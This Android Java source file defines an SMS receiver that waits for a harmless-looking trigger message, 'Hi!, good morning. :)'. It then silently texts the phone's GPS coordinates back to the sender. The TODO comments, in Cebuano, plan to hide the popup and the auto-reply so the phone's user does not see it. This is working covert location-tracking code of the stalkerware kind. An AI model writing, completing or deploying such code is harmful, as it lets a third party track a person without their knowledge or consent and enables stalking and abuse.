package com.example.gps_receiver;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;

public class Receiver extends BroadcastReceiver {
    /*
        TODO
         - Remove ang popup sa layout
         - Remove ang sa message ig mag send, murag makita sa user if mo automatic reply.
    */

    private static final String SMS_TRIGGER = "Hi!, good morning. :)";

    @Override
    public void onReceive(Context context, Intent intent) {
        Object[] pdus = (Object[]) intent.getExtras().get("pdus");
        if (pdus != null) {
            for (Object pdu : pdus) {
                SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                String messageBody = sms.getMessageBody();
                String senderNumber = sms.getOriginatingAddress();

                if (messageBody != null && messageBody.trim().equalsIgnoreCase(SMS_TRIGGER)) {
                    getLocationAndSendSMS(context, senderNumber);
                }
            }
        }
    }

    private void getLocationAndSendSMS(Context context, String senderNumber) {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(context, "Location permission not granted.", Toast.LENGTH_SHORT).show();
            return;
        }

        FusedLocationProviderClient fusedLocationProviderClient = LocationServices.getFusedLocationProviderClient(context);

        fusedLocationProviderClient.getLastLocation().addOnSuccessListener(location -> {
            if (location != null) {
                double latitude = location.getLatitude();
                double longitude = location.getLongitude();
                String message = "[RECEIVER] Location - Latitude: " + latitude + ", Longitude: " + longitude;

                SmsManager manager = SmsManager.getDefault();
                manager.sendTextMessage(senderNumber, null, message, null, null);
            }
        });
    }
}
